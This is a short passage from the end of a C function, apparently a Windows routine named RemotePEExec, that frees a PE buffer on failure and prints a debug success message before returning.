		if (pPeBuffer) {
			HeapFree(GetProcessHeap(), 0, pPeBuffer);
		}
		return -1;
	}
#ifdef DEBUG
	printf("[+] RemotePEExec completed successfully.\n");
#endif // DEBUG

	return 0;
}
